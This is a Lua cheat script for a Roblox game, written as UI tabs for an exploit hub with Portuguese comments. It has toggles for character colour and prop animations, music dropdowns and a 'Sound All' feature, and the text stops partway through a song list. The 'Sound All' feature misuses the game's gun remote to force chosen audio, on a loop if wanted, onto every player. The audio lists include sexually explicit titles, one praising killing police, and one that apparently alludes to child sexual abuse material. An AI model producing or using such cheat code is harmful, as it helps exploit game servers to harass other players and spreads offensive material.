local colors = { "Bright red", "Lime green", "Bright blue", "Bright yellow", "Bright cyan", "Hot pink", "Royal purple" }

local rgbEnabled = false



local function changeColor(color)

    local args = { color }

    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor"):FireServer(unpack(args))

end



local function toggleRGBCharacter(enabled)

    rgbEnabled = enabled

    if rgbEnabled then

        while rgbEnabled do

            for _, color in ipairs(colors) do

                if not rgbEnabled then return end

                changeColor(color)

                wait(0.5)

            end

        end

    end

end

Tab:AddToggle({

    Name = "RGB Character",

    Description = "Make your character RGB",

    Default = false,

    Callback = function(value)

        toggleRGBCharacter(value)

    end

})


-- ============================================================
--  ABA PROPS  (porte do Spectra Hub -> estilo Scarlet Hub)
--  Cole depois de criar o `Window`.
--  Só mexe nos SEUS props (nome do prop contém o seu nome).
-- ============================================================
do
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")

    local LocalPlayer = Players.LocalPlayer
    local RE = ReplicatedStorage:WaitForChild("RE")

    -- Prop que o Spawn Prop usa (troque aqui se quiser outro)
    local SPAWN_PROP = { "FurnitureBleachers", "Furniture" }
    local SPAWN_RADIUS = 10
    local SPAWN_STEP = math.rad(30)  -- passo do ângulo
    local SPAWN_CONE = math.rad(70)  -- não spawna na frente do player
    local PI2 = math.pi * 2

    local PropsTab = Window:MakeTab({ "Props", "package" })

    -- ========================================================
    --  HELPERS
    -- ========================================================
    local function GetRoot()
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if root and hum and hum.Health > 0 then
            return root
        end
    end

    -- props que são seus (têm SetCurrentCFrame e o seu nome)
    local function GetMyProps()
        local list = {}
        local com = workspace:FindFirstChild("WorkspaceCom")
        if not com then
            return list
        end

        local myName = LocalPlayer.Name:lower()
        for _, folder in ipairs(com:GetChildren()) do
            for _, prop in ipairs(folder:GetChildren()) do
                if prop:FindFirstChild("SetCurrentCFrame") and prop.Name:lower():find(myName, 1, true) then
                    table.insert(list, prop)
                end
            end
        end
        return list
    end

    -- move um prop (alpha = suavização opcional)
    local function SetProp(prop, cf, alpha)
        pcall(function()
            if alpha then
                cf = prop:GetPivot():Lerp(cf, alpha)
            end
            prop.SetCurrentCFrame:InvokeServer(cf)
        end)
    end

    local function PickPropMaker()
        pcall(function()
            RE["1Too1l"]:InvokeServer("PickingTools", "PropMaker")
        end)
    end

    -- ========================================================
    --  AUTO RGB PROPS
    -- ========================================================
    PropsTab:AddSection({ "Props RGB" })

    local rgb = { Props = {}, Conns = {} }

    local function IsMyColorProp(obj)
        return obj:IsA("Model")
            and obj.Name:find(LocalPlayer.Name, 1, true) ~= nil
            and obj:FindFirstChild("ChangePropColor") ~= nil
    end

    local function StopRGB()
        for _, conn in ipairs(rgb.Conns) do
            conn:Disconnect()
        end
        rgb.Conns = {}
        rgb.Props = {}
    end

    local function StartRGB()
        StopRGB()

        local com = workspace:FindFirstChild("WorkspaceCom")
        if not com then
            return
        end

        for _, obj in ipairs(com:GetDescendants()) do
            if IsMyColorProp(obj) then
                table.insert(rgb.Props, obj)
            end
        end

        table.insert(rgb.Conns, com.DescendantAdded:Connect(function(obj)
            if IsMyColorProp(obj) and not table.find(rgb.Props, obj) then
                table.insert(rgb.Props, obj)
            end
        end))

        table.insert(rgb.Conns, RunService.Heartbeat:Connect(function()
            local color = Color3.fromHSV(tick() * 0.5 % 1, 1, 1)
            for i = #rgb.Props, 1, -1 do
                local prop = rgb.Props[i]
                if not prop or not prop.Parent then
                    table.remove(rgb.Props, i)
                else
                    pcall(function()
                        prop.ChangePropColor:InvokeServer(color)
                    end)
                end
            end
        end))
    end

    PropsTab:AddToggle({
        Name = "Auto RGB Props",
        Default = false,
        Callback = function(on)
            if on then
                StartRGB()
            else
                StopRGB()
            end
        end
    })

    -- ========================================================
    --  SPAWN PROP
    -- ========================================================
    PropsTab:AddSection({ "Spawn Prop" })

    local spawner = { On = false, Id = 0, Angle = 0 }

    local function SpawnOneProp()
        local root = GetRoot()
        if not root then
            return
        end

        local char = LocalPlayer.Character
        local tool = char:FindFirstChild("PropMaker") or LocalPlayer.Backpack:FindFirstChild("PropMaker")
        if not tool then
            PickPropMaker()
            tool = LocalPlayer.Backpack:FindFirstChild("PropMaker")
        end
        if not tool then
            return
        end
        tool.Parent = char

        -- escolhe um ângulo fora do cone da frente do player
        local look = root.CFrame.LookVector
        local facing = math.atan2(look.Z, look.X)
        local angle = spawner.Angle
        for _ = 1, 100 do
            local diff = math.abs((angle - facing + math.pi) % PI2 - math.pi)
            if diff >= SPAWN_CONE then
                break
            end
            angle = (angle + SPAWN_STEP) % PI2
        end
        spawner.Angle = (angle + SPAWN_STEP) % PI2

        local pos = root.Position + Vector3.new(math.cos(angle) * SPAWN_RADIUS, 0, math.sin(angle) * SPAWN_RADIUS)
        local model = workspace:FindFirstChild("Model")
        local sidewalk = model and model:FindFirstChild("Sidewalk")
        if not sidewalk then
            return
        end

        tool:WaitForChild("Tool_PropMake"):FireServer(sidewalk, pos)
    end

    PropsTab:AddToggle({
        Name = "Spawn Prop",
        Default = false,
        Callback = function(on)
            spawner.On = on
            spawner.Id += 1
            if not on then
                return
            end

            local id = spawner.Id
            task.spawn(function()
                PickPropMaker()
                task.wait(0.3)
                pcall(function()
                    RE["1Clea1rTool1s"]:FireServer("RequestingPropName", SPAWN_PROP[1], SPAWN_PROP[2])
                end)

                while spawner.On and spawner.Id == id do
                    pcall(SpawnOneProp)
                    task.wait(0.2)
                end
            end)
        end
    })

    -- ========================================================
    --  EFEITOS (cada um: toggle + sliders)
    --  Sliders: { "Nome", "Chave em Settings", min, max, incremento }
    -- ========================================================
    local Effects = {
        {
            Section = "Prop Cobra",
            Toggle = "Prop Cobra",
            Settings = { Speed = 10, Distance = 3.5, Side = 3.2 },
            Sliders = {
                { "Cobra Speed", "Speed", 1, 100 },
                { "Cobra Distance", "Distance", 1, 20 },
                { "Cobra Side", "Side", 0, 15 },
            },
            Step = function(s, dt, props, root)
                s.Time += dt * s.Speed
                local cf = root.CFrame
                local back = -cf.LookVector

                for i, prop in ipairs(props) do
                    local t = s.Time - i * 1.1
                    local side = math.sin(t) * s.Side
                    local height = math.cos(t * 0.8) * 1.4
                    local wiggle = math.sin(t * 0.4) * 0.6
                    local pos = root.Position
                        + back * (s.Distance * i)
                        + cf.RightVector * (side + wiggle)
                        + Vector3.new(0, height, 0)
                    SetProp(prop, CFrame.new(pos, pos + back), 0.35)
                end
            end
        },

        {
            Section = "Prop Orbit",
            Toggle = "Prop Orbit",
            Settings = { Speed = 5, Radius = 10, Height = 6 },
            Sliders = {
                { "Orbit Speed", "Speed", 1, 100 },
                { "Orbit Radius", "Radius", 2, 80 },
                { "Orbit Height", "Height", 0, 12 },
            },
            Step = function(s, dt, props, root)
                s.Time += dt * s.Speed
                local cf = root.CFrame

                for i, prop in ipairs(props) do
                    local a = s.Time + i * (PI2 / #props)
                    local pos = root.Position
                        + cf.RightVector * (math.cos(a) * s.Radius)
                        + cf.LookVector * (math.sin(a) * s.Radius)
                        + Vector3.new(0, s.Height - 6, 0)
                    SetProp(prop, CFrame.new(pos, root.Position))
                end
            end
        },

        {
            Section = "Prop Estrelas",
            Toggle = "Props Strela",
            Settings = { Speed = 1, Height = 30, Spacing = 12 },
            Sliders = {
                { "Velocidade", "Speed", 0.1, 5, 0.1 },
                { "Altura", "Height", 10, 80 },
                { "Espaçamento", "Spacing", 5, 40 },
            },
            Step = function(s, dt, props, root)
                s.Time += dt * s.Speed

                for i, prop in ipairs(props) do
                    local ang = i * 2.5
                    local radius = s.Spacing + i * 2
                    local offset = Vector3.new(
                        math.cos(ang) * radius + math.sin(s.Time * 1.5 + i * 3) * 4,
                        s.Height + math.sin(s.Time + i * 1.2) * 4,
                        math.sin(ang) * radius + math.cos(s.Time * 1.3 + i * 2) * 4
                    )
                    local spin = CFrame.Angles(
                        math.rad((s.Time * 40 + i * 50) % 360),
                        math.rad((s.Time * 35 + i * 30) % 360),
                        math.rad((s.Time * 25 + i * 60) % 360)
                    )
                    SetProp(prop, CFrame.new(root.Position + offset) * spin, 0.3)
                end
            end
        },

        {
            Section = "Prop Arms",
            Toggle = "Prop Arms",
            Settings = { Spacing = 3, Height = 1.5, Front = 4, Curve = 1 },
            Sliders = {
                { "Wing Spacing", "Spacing", 1, 15 },
                { "Wing Height", "Height", -3, 6 },
                { "Front Prop Distance", "Front", 2, 12 },
                { "Wing Curve", "Curve", 0, 6 },
            },
            Step = function(s, dt, props, root)
                local cf = root.CFrame
                local up = Vector3.new(0, s.Height, 0)
                local first = 1

                -- quantidade ímpar: o primeiro prop fica na frente
                if #props % 2 ~= 0 then
                    SetProp(props[1], CFrame.new(root.Position + cf.LookVector * s.Front + up))
                    first = 2
                end

                local count = 0
                for i = first, #props do
                    count += 1
                    local side = count % 2 ~= 0 and 1 or -1
                    local step = math.ceil(count / 2)
                    local pos = root.Position
                        + cf.RightVector * (side * (s.Spacing * step + 1.5))
                        - cf.LookVector * (step * s.Curve)
                        + up
                    SetProp(props[i], CFrame.new(pos))
                end
            end
        },

        {
            Section = "Prop Tornado",
            Toggle = "Prop Tornado",
            Settings = { Speed = 5, Size = 6, Height = 12 },
            Sliders = {
                { "Tornado Speed", "Speed", 1, 60 },
                { "Tornado Size", "Size", 2, 40 },
                { "Tornado Height", "Height", 5, 60 },
            },
            Step = function(s, dt, props, root)
                s.Time += dt * s.Speed
                local cf = root.CFrame

                for i, prop in ipairs(props) do
                    local f = i / #props
                    local a = s.Time + i * 0.6
                    local pos = root.Position
                        + cf.RightVector * (math.cos(a) * s.Size * f)
                        + cf.LookVector * (math.sin(a) * s.Size * f)
                        + Vector3.new(0, f * s.Height, 0)
                    local spin = CFrame.Angles(math.rad(s.Time * 40), math.rad(s.Time * 60), 0)
                    SetProp(prop, CFrame.new(pos) * spin, 0.35)
                end
            end
        },

        {
            Section = "Prop Portal",
            Toggle = "Prop Portal",
            Settings = { Speed = 1, Size = 6, Distance = 8, Height = 2 },
            Sliders = {
                { "Portal Speed", "Speed", 1, 100 },
                { "Portal Size", "Size", 1, 100 },
                { "Portal Distance", "Distance", 1, 100 },
                { "Portal Height", "Height", 1, 100 },
            },
            Step = function(s, dt, props, root)
                s.Time += dt * s.Speed * 0.8
                local cf = root.CFrame
                local center = root.Position + cf.LookVector * s.Distance + Vector3.new(0, s.Height, 0)

                for i, prop in ipairs(props) do
                    local a = (i - 1) / #props * PI2 + s.Time
                    local x = math.cos(a) * s.Size
                    local y = math.sin(a) * s.Size
                    local pos = center + cf.RightVector * x + Vector3.new(0, y, 0)
                    local spin = CFrame.Angles(math.rad(y * 5), math.rad(a * 180 / math.pi), 0)
                    SetProp(prop, CFrame.new(pos) * spin, 0.25)
                end
            end
        },

        {
            Section = "Prop Alinhado",
            Toggle = "Alinhado",
            Settings = { Forward = 2, Spacing = 3, Sway = 0.15, Speed = 1.5, Height = -2 },
            Sliders = {
                { "Espaço Linha", "Spacing", 1, 10 },
                { "Movimento Lateral Suave", "Sway", 0, 1, 0.05 },
            },
            Step = function(s, dt, props, root)
                s.Time += dt * s.Speed
                local cf = root.CFrame
                local look, right = cf.LookVector, cf.RightVector
                local base = root.Position + look * s.Forward + Vector3.new(0, s.Height, 0)

                for i, prop in ipairs(props) do
                    local amp = s.Sway * (0.8 + i / #props * 0.5)
                    local pos = base
                        + look * (s.Spacing * (i - 1))
                        + right * (math.sin(s.Time + i * 0.5) * amp)
                    SetProp(prop, CFrame.new(pos, pos + look), 0.35)
                end
            end
        },
    }

    -- ========================================================
    --  MOTOR DOS EFEITOS (uma conexão por efeito, para/inicia certo)
    -- ========================================================
    local function StopEffect(fx)
        if fx.Connection then
            fx.Connection:Disconnect()
            fx.Connection = nil
        end
    end

    local function StartEffect(fx)
        StopEffect(fx)
        fx.Settings.Time = 0

        fx.Connection = RunService.Heartbeat:Connect(function(dt)
            local root = GetRoot()
            if not root then
                return
            end

            local props = GetMyProps()
            if #props == 0 then
                return
            end

            fx.Step(fx.Settings, dt, props, root)
        end)
    end

    for _, fx in ipairs(Effects) do
        PropsTab:AddSection({ fx.Section })

        PropsTab:AddToggle({
            Name = fx.Toggle,
            Default = false,
            Callback = function(on)
                if on then
                    StartEffect(fx)
                else
                    StopEffect(fx)
                end
            end
        })

        for _, sl in ipairs(fx.Sliders) do
            PropsTab:AddSlider({
                Name = sl[1],
                Min = sl[3],
                Max = sl[4],
                Increase = sl[5] or 1,   -- redzlib usa Increase
                Increment = sl[5] or 1,  -- algumas versões usam Increment
                Default = fx.Settings[sl[2]],
                Callback = function(value)
                    fx.Settings[sl[2]] = value
                end
            })
        end
    end
end


local TabSound = Window:MakeTab({"Sound All", "volume-2"})


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Função para tocar som globalmente via Remote
local function tocarGlobalmente(soundId)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            local args = {
                [1] = hrp,
                [2] = hrp,
                [3] = Vector3.new(0, -1, 0),
                [4] = Vector3.new(0, 0, 0),
                [5] = hrp,
                [6] = hrp,
                [7] = tostring(soundId),
                [8] = tostring(soundId),
                [9] = { [1] = true },
                [10] = {
                    [1] = 25,
                    [2] = Vector3.new(0.25, 0.25, 100),
                    [3] = BrickColor.new(24),
                    [4] = 0.25,
                    [5] = Enum.Material.SmoothPlastic,
                    [6] = 0.25
                },
                [11] = true,
                [12] = false
            }

            local remote = ReplicatedStorage:FindFirstChild("RE")
            if remote and remote:FindFirstChild("1Gu1n") then
                pcall(function()
                    remote["1Gu1n"]:FireServer(unpack(args))
                end)
            end
        end
    end
end

-- Variáveis
local loopAtivo = false
local InputID = ""

-- TextBox para inserir o ID
TabSound:AddTextBox({
    Name = "Insira o ID Audio All",
    Description = "Digite o ID do som que deseja tocar globalmente",
    PlaceholderText = "Exemplo: 1234567890",
    ClearTextOnFocus = true,
    Callback = function(text)
        InputID = tonumber(text)
    end
})

-- Botão para tocar o som
TabSound:AddButton({
    Name = "Tocar Som Global",
    Description = "Toca o áudio para todos os jogadores",
    Callback = function()
        if InputID then
            tocarGlobalmente(InputID)

            local globalSound = Instance.new("Sound")
            globalSound.Parent = Workspace
            globalSound.SoundId = "rbxassetid://" .. InputID
            globalSound.Volume = 3
            globalSound.Looped = false
            globalSound:Play()

            task.delay(5, function()
                globalSound:Destroy()
            end)
        end
    end
})

-- Toggle de Loop Global
TabSound:AddToggle({
    Name = "Loop Global",
    Description = "Repetir som globalmente",
    Default = false,
    Callback = function(state)
        loopAtivo = state
        if loopAtivo then
            task.spawn(function()
                while loopAtivo do
                    if InputID then
                        tocarGlobalmente(InputID)

                        local globalSound = Instance.new("Sound")
                        globalSound.Parent = Workspace
                        globalSound.SoundId = "rbxassetid://" .. InputID
                        globalSound.Volume = 3
                        globalSound.Looped = false
                        globalSound:Play()

                        task.delay(5, function()
                            globalSound:Destroy()
                        end)
                    end
                    task.wait(3)
                end
            end)
        end
    end
})

TabSound:AddSection({ "memes-" })

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Função para tocar som globalmente via Remote
local function tocarGlobalmente(soundId)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            local args = {
                [1] = hrp,
                [2] = hrp,
                [3] = Vector3.new(0, -1, 0),
                [4] = Vector3.new(0, 0, 0),
                [5] = hrp,
                [6] = hrp,
                [7] = tostring(soundId),
                [8] = tostring(soundId),
                [9] = { [1] = true },
                [10] = {
                    [1] = 25,
                    [2] = Vector3.new(0.25, 0.25, 100),
                    [3] = BrickColor.new(24),
                    [4] = 0.25,
                    [5] = Enum.Material.SmoothPlastic,
                    [6] = 0.25
                },
                [11] = true,
                [12] = false
            }

            local remote = ReplicatedStorage:FindFirstChild("RE")
            if remote and remote:FindFirstChild("1Gu1n") then
                pcall(function()
                    remote["1Gu1n"]:FireServer(unpack(args))
                end)
            end
        end
    end
end

-- Lista completa de sons de memes
local sonsMemes = {
    {name = "Trollface laugh", id = "73753120048787"},
    {name = "troll face sussy", id = "9098738774"},
    {name = "troll cut", id = "8389041427"},
    {name = "troll transition", id = "7705506391"},
    {name = "troll laugh", id = "7816195044"},
    {name = "Magic2", id = "9066733515"},
    {name = "homero brasileo", id = "115224076671067"},
    {name = "LOUD Youve been trolled", id = "6787686247"},
    {name = "Fart Meme Sound", id = "6454805792"},
    {name = "Metal Rattle 2 SFX", id = "9116788555"},
    {name = "Hentai wiaaaaan", id = "88332347208779"},
    {name = "iamete cunasai", id = "108494476595033"},
    {name = "dodichan onnn...", id = "134640594695384"},
    {name = "Toma jack", id = "132603645477541"},
    {name = "Toma jackV2", id = "100446887985203"},
    {name = "Toma jack no sol quente", id = "97476487963273"},
    {name = "ifood", id = "133843750864059"},
    {name = "pelo geito ela ta querendo ram", id = "94395705857835"},
    {name = "lula vai todo mundo", id = "136804576009416"},
    {name = "coringa", id = "84663543883498"},
    {name = "shoope", id = "8747441609"},
    {name = "quenojo", id = "103440368630269"},
    {name = "sai dai lava prato", id = "101232400175829"},
    {name = "se e loko numconpeça", id = "78442476709262"},
    {name = "mita sequer que eu too uma", id = "94889439372168"},
    {name = "Hoje vou ser tua mulher e tu", id = "90844637105538"},
    {name = "Deita aqui eu mandei vc deitar sirens", id = "100291188941582"},
    {name = "miau", id = "131804436682424"},
    {name = "skibidi", id = "128771670035179"},
    {name = "BIRULEIBI", id = "121569761604968"},
    {name = "sai", id = "121169949217007"},
    {name = "risada boa dms", id = "127589011971759"},
    {name = "vacilo perna de pau", id = "106809680656199"},
    {name = "gomo gomo no!!!", id = "137067472449625"},
    {name = "arroto", id = "140203378050178"},
    {name = "iraaaa", id = "136752451575091"},
    {name = "não fica se achando muito não", id = "101588606280167"},
    {name = "WhatsApp notificação", id = "107004225739474"},
    {name = "Samsung", id = "123767635061073"},
    {name = "Shiiii", id = "120566727202986"},
    {name = "ai_tomaa miku", id = "139770074770361"},
    {name = "kuru_kuru", id = "122465710753374"},
    {name = "PM ROCAM", id = "96161547081609"},
    {name = "cavalo!!", id = "78871573440184"},
    {name = "deixa os garoto brinca", id = "80291355054807"},
    {name = "flamengo", id = "137774355552052"},
    {name = "sai do mei satnas", id = "127944706557246"},
    {name = "namoral agora e a hora", id = "120677947987369"},
    {name = "n pode me chutar pq seu celebro e burro", id = "82284055473737"},
    {name = "vc ta fudido vou te pegar", id = "120214772725166"},
    {name = "deley", id = "102906880476838"},
    {name = "Tu e um beta", id = "130233956349541"},
    {name = "Porfavor n tira eu nao", id = "85321374020324"},
    {name = "Olá beleza vc pode me dá muitos", id = "74235334504693"},
    {name = "Discord sus", id = "122662798976905"},
    {name = "rojao apito", id = "6549021381"},
    {name = "off", id = "1778829098"},
    {name = "Kazuma kazuma", id = "127954653962405"},
    {name = "sometourado", id = "123592956882621"},
    {name = "Estouradoespad", id = "136179020015211"},
    {name = "Alaku bommm", id = "110796593805268"},
    {name = "busss", id = "139841197791567"},
    {name = "Estourado wItb", id = "137478052262430"},
    {name = "sla", id = "116672405522828"},
    {name = "HA HA HA", id = "138236682866721"}
}

-- Preparar dropdown
local nomesSons = {}
local mapaSons = {}
for _, v in ipairs(sonsMemes) do
    table.insert(nomesSons, v.name)
    mapaSons[v.name] = v.id
end

local loopDropdownAtivo = false
local somSelecionado = nil

-- Cria dropdown
TabSound:AddDropdown({
    Name = "Memes Sons Globais",
    Description = "Escolha um som para tocar globalmente",
    Default = nomesSons[1],
    Options = nomesSons,
    Callback = function(valor)
        somSelecionado = mapaSons[valor]
    end
})

-- Botão de tocar som
TabSound:AddButton({
    Name = "Tocar Som Selecionado",
    Description = "Toca o som globalmente",
    Callback = function()
        if somSelecionado then
            tocarGlobalmente(somSelecionado)
            local s = Instance.new("Sound")
            s.SoundId = "rbxassetid://" .. somSelecionado
            s.Volume = 3
            s.Looped = false
            s.Parent = Workspace
            s:Play()
            task.delay(5, function() s:Destroy() end)
        end
    end
})

-- Toggle loop global
TabSound:AddToggle({
    Name = "Loop Som Global",
    Description = "Repete o som selecionado globalmente",
    Default = false,
    Callback = function(estado)
        loopDropdownAtivo = estado
        if loopDropdownAtivo then
            task.spawn(function()
                while loopDropdownAtivo do
                    if somSelecionado then
                        tocarGlobalmente(somSelecionado)
                        local s = Instance.new("Sound")
                        s.SoundId = "rbxassetid://" .. somSelecionado
                        s.Volume = 3
                        s.Looped = false
                        s.Parent = Workspace
                        s:Play()
                        task.delay(5, function() s:Destroy() end)
                    end
                    task.wait(1)
                end
            end)
        end
    end
})


local Tab = Window:MakeTab({"Music", "music"})

local function tocarMusica(id)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Rádio (ToolMusicText)
    local argsRadio = {
        [1] = "ToolMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("PlayerToolEvent"):FireServer(unpack(argsRadio))
    
    -- Casa (PickHouseMusicText)
    local argsCasa = {
        [1] = "PickHouseMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(argsCasa))

    -- Carro (PickingCarMusicText)
    local argsCarro = {
        [1] = "PickingCarMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(argsCarro))

    -- Scooter (PickingScooterMusicText)
    local argsScooter = {
        [1] = "PickingScooterMusicText",
        [2] = id
    }
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(argsScooter))
end

local function isValidMusicId(value)
    return value and value ~= "" and value ~= "Option 1" and not value:match("novas musica adds") and not value:match("musica brasil") and not value:match("musica do meu interece") and not value:match("musica dls por elas") and not value:match("meme abaixo") and not value:match("estourada")
end

Tab:AddTextBox({
    Name = "ID da música",
    PlaceholderText = "Digite o ID e pressione Enter",
    Callback = function(value)
        if value and value ~= "" then
            tocarMusica(tostring(value))
        end
    end
})

-- Dropdowns para Tab
local function createMusicDropdown(title, musicOptions, defaultOption)
    local musicNames = {}
    local categoryMap = {}
    for category, sounds in pairs(musicOptions) do
        for _, music in ipairs(sounds) do
            if music.name ~= "" then
                table.insert(musicNames, music.name)
                categoryMap[music.name] = {id = music.id, category = category}
            end
        end
    end

    local function playMusic(soundId)
        tocarMusica(tostring(soundId)) -- Usa a função tocarMusica para tocar em todos os contextos
    end

    Tab:AddDropdown({
        Name = title,
        Description = "all",
        Default = defaultOption,
        Multi = false,
        Options = musicNames,
        Callback = function(selectedSound)
            if selectedSound and categoryMap[selectedSound] then
                local soundId = categoryMap[selectedSound].id
                if soundId and soundId ~= "" and soundId ~= "4354908569" then
                    playMusic(soundId)
                end
            end
        end
    })
end

-- Dropdown "Forro"
createMusicDropdown("Forro", {
    ["forro"] = {
        {name = "forro mt bom", id = "106412079335663"},
        {name = "lembranças", id = "111551362636063"},
        {name = "Passinho do barão", id = "127786586963377"},
        {name = "Bloquinho Macumbeira", id = "138345050819224"},
        {name = "eu já tava bem", id = "93590122047380"},
        {name = "PISEIRO ESTOURADO (20 sgds de intro)", id = "133190351316780"},
        {name = "forro ja cansou", id = "74812784884330"},
        {name = "GRELO E O FE", id = "72200166265935"},
        {name = "lenbro ate hoje", id = "71531533552899"},
        {name = "escolha certa", id = "107088620814881"},
        {name = "forro da rezenha", id = "120973520531216"},
        {name = "forro dudu", id = "74404168179733"},
        {name = "forro sao joao", id = "106364874935196"},
        {name = "forro engraçado paia", id = "76524290482399"},
        {name = "100% forro vaquejada", id = "92295159623916"},
        
        {name = "PASTOR MIRIM E A LÍNGUA DOS ANJOS", id = "71153532555470"},
        {name = "PARA NÃO ESQUECER QUEM SOMOS", id = "88937498361674"},
        {name = "Uno zero", id = "112959083808887"},
        {name = "Iate do neymar", id = "135738534706063"},
        {name = "Batidao na aldeia", id = "79953696595578"},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

-- Dropdown "Musicas e Memes Aleatorio"
createMusicDropdown("Musicas e Memes Aleatorio", {
    ["forro"] = {
        {name = "desca dai seu corno", id = "119738878921996"},
        {name = "GTA ESTOURADO", id = "109337680029292"},
        {name = "ANXIETY (Amapiano Re-fix)", id = "101483901475189"}, 
        {name = "Meu corpo, minhas regras", id = "127587901595282"},
        {name = "Megalovania but its only the melodies", id = "104500091160463"},
        {name = "androphono strikes back", id = "78312089943968"},
        {name = "Bamm Bamm", id = "128730685516895"},
        {name = "longe de mais", id = "124478512057763"},
        {name = "Garoto de Copacabana", id = "135648634110254"},
        {name = "CELL!", id = "117634275895085"},
        {name = "Boa vibe em Ubatuba", id = "139059061493558"},
        {name = "SLIP AWAY", id = "126152928520174"},
        {name = "Alone in Motion", id = "122379348696948"},
        {name = "Fade Away", id = "81002139735874"},
        {name = "Wounds & Wishes", id = "109347979566607"},
        {name = "Ascensão do Monarca", id = "101864243033211"},
        {name = "carro do ovo", id = "3148329638"},
        {name = "ingles bus (fling ou kill bus)", id = "123268013026823"},
        {name = "MIKU MIKU HATSUNE", id = "112783541496955"},
        {name = "Escalando a Seleção Brasileira para a Copa", id = "116546457407236"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""}
    }
}, "Option 1")

-- Dropdown "Funk"
createMusicDropdown("Funk", {
    ["Funk"] = {
        {name = "Meu Hd Chei De Cp", id = "118351471702293"},
        {name = "sla", id = "134763052215450"},
        {name = "tls", id = "126036553384258"},
        {name = "hoje eu acordei", id = "127870629973068"},
        {name = "aquela sister", id = "97708834121472"},
        {name = "set mc mn funk", id = "78631447496051"},
        {name = "tô com o piru desgovernado", id = "115837046053738"},
        {name = "eu tô doida pra te dar", id = "11505819302675"},
        {name = "eu não sou gay", id = "82816587043443"},
        {name = "i like trains", id = "94410505324605"},
        {name = "quem gosta de bucetão", id = "84434631780133"},
        {name = "vai mamar o bonde", id = "137888824649807"},
        {name = "sla", id = "92524227941055"},
        {name = "vem me fudendo", id = "136574160308808"},
        {name = "matar os policia e nossa meta", id = "72559750723073"},
        {name = "AURA!", id = "112984167725214"},
        {name = "Carnavel - mc mamãe", id = "96934467275534"},
        {name = "o sossego acabou", id = "125354466627612"},
        {name = "Uniao Flasco", id = "81628621752701"},
        {name = "ANALONG FUNK", id = "112214814544629"},
        {name = "LALALALA", id = "107314654399868"},
        {name = "BALINHA", id = "112406825739796"},
        {name = "Amor Hospitalar", id = "96259351729049"},
        {name = "Assobio Turbulento", id = "88975584625558"},
        {name = "Tentar", id = "131267110896054"},
        {name = "FUNK NARUTO", id = "89473100926016"},
        {name = "eu gosto de tu fy", id = "73937969824874"},
        {name = "MACET 2 FUNK", id = "97063553131882"},
        {name = "Não Trate a Natalia mal", id = "76860168288557"},
        {name = "ou ou ou", id = "126196231406971"},
        {name = "meca", id = "108226178439659"},
        {name = "antares", id = "122938948937941"},
        {name = "Piranha Piranha", id = "123238370098753"},
        {name = "Batida do Tal Do Tbt", id = "91007045451630"},
        {name = "comeno uma prkinha", id = "94214367115154"},
        {name = "soca na danada", id = "100337717591420"},
        {name = "desce talarica", id = "110363768678499"},
        {name = "RITMADA DE VILAO", id = "121405804171398"},
        {name = "Paredao morcegao", id = "138120757806690"},
        {name = "Jogo", id = "73198805524530"},
        {name = "BEM VINDO AO HELIPA", id = "94672348312515"},
        {name = "de sainha bem curtinha (40s intro)", id = "140655042547224"},
        {name = "Ajoelha", id = "127052251825619"},
        {name = "Eu não nasci pra trabalhar", id = "95197852052116"},
        {name = "BITCH!", id = "103288558732219"},
        {name = "arabe funk", id = "93451391025129"},
        {name = "PUXANDO CBL", id = "78631447496051"},
        {name = "REBOLA", id = "121046655523341"},
        {name = "JOGA NO PAI", id = "128011871344522"},
        {name = "RADINHO", id = "139693447546059"},
        {name = "ESTOURADAO KKKK", id = "86839065790068"},
        {name = "TIPO NINO", id = "140336018782383"},
        {name = "NINO PT2", id = "97708834121472"},
        {name = "EXCITADINHA? KKKK", id = "110176270788146"},
        {name = "BERIMBAU KK", id = "77712236704085"},
        {name = "NAT FUNK", id = "107416893652681"},
        {name = "MTG EXPLODE", id = "81384105684889"},
        {name = "envolvidão (15 sgds de intro)", id = "127775034804421"},
        {name = "RAIL GRIND ESTOURADOOO", id = "135958179501280"},
        {name = "CLYXAL X NYT", id = "100258273816054"},
        {name = "SENTA E RBL", id = "107513285979080"},
        {name = "chairy", id = "130071638363509"},
        {name = "Seu Pedreiro", id = "116272171755349"},
        {name = "fuga na viatura", id = "131891110268352"},
        {name = "funkphonk fumando verde", id = "112143944982807"},
        {name = "que que sharke", id = "129546408528391"},
        {name = "pre treino", id = "136869502216760"},
        {name = "CVRL", id = "124244582950595"},
        {name = "batida Brega Violino (Beat Brega Funk)", id = "99399643204701"},
        {name = "Dança do Canguru (Pke Gaz1nh)", id = "86876136192157"},
        {name = "MONTAGEM ARABIANA (Pke Gaz1nh)", id = "78076624091098"},
        {name = "Manda o papo (NGI)", id = "132642647937688"},
        {name = "Viver bem", id = "82805460494325"},
        {name = "Faixa estronda", id = "121187736532042"},
        {name = "Ritmo Pixelado", id = "93928823862203"},
        {name = "Viagem Sonora", id = "79349174602261"},
        {name = "Melodia Virtual", id = "139147474886402"},
        {name = "Melodia Serena", id = "97011217688307"},
        {name = "SENTA", id = "124085422276732"},
